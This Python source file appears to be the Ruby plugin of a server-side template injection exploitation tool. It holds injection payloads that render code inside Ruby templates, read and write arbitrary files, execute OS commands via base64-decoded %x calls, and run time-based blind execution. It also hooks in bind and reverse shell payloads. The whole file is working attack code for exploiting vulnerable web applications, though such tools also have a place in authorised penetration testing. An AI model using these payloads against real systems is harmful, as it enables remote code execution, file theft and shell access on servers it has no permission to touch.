from utils.strings import quote
from core.plugin import Plugin
from plugins.languages import bash
from utils.loggers import log
from utils import rand
import base64
import re

class Ruby(Plugin):
    
    def language_init(self):

        self.update_actions({
            'render' : {
                'render': '"#{%(code)s}"',
                'header': """'%(header)s'+""",
                'trailer': """+'%(trailer)s'""",
                'test_render': """%(s1)i*%(s2)i""" % { 
                    's1' : rand.randints[0], 
                    's2' : rand.randints[1]
                },
                'test_render_expected': '%(res)s' % { 
                    'res' : rand.randints[0]*rand.randints[1]
                }
            },
            'write' : {
                'call' : 'inject',
                'write': """require'base64';File.open('%(path)s', 'ab+') {|f| f.write(Base64.urlsafe_decode64('%(chunk_b64)s')) }""",
                'truncate' : """File.truncate('%(path)s', 0)"""
            },
            'read' : {
                'call': 'evaluate',
                'read': """(require'base64';Base64.encode64(File.binread("%(path)s"))).to_s""",
            },
            'md5' : {
                'call': 'evaluate',
                'md5': """(require'digest';Digest::MD5.file("%(path)s")).to_s"""
            },
            'evaluate' : {
                'call': 'render',
                'evaluate': """%(code)s""",
                'test_os' : """RUBY_PLATFORM""",
                'test_os_expected': '^[\w._-]+$'
            },
            'execute' : {
                'call': 'evaluate',
                'execute': """(require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')})).to_s""",
                'test_cmd': bash.printf % { 's1': rand.randstrings[2] },
                'test_cmd_expected': rand.randstrings[2]
            },
            'blind' : {
                'call': 'evaluate_blind',
                'test_bool_true' : """1.to_s=='1'""",
                'test_bool_false' : """1.to_s=='2'"""
            },
            'evaluate_blind' : {
                'call': 'inject',
                'evaluate_blind': """require'base64';eval(Base64.urlsafe_decode64('%(code_b64)s'))&&sleep(%(delay)i)"""
            },
            'bind_shell' : {
                'call' : 'execute_blind',
                'bind_shell': bash.bind_shell
            },
            'reverse_shell' : {
                'call': 'execute_blind',
                'reverse_shell' : bash.reverse_shell
            },
            'execute_blind' : {
                'call': 'inject',
                'execute_blind': """require'base64';%%x(#{Base64.urlsafe_decode64('%(code_b64)s')+' && sleep %(delay)i'})"""
            },
        })

        self.set_contexts([

            # Text context, no closures
            { 'level': 0 },
        ])

    language = 'ruby'
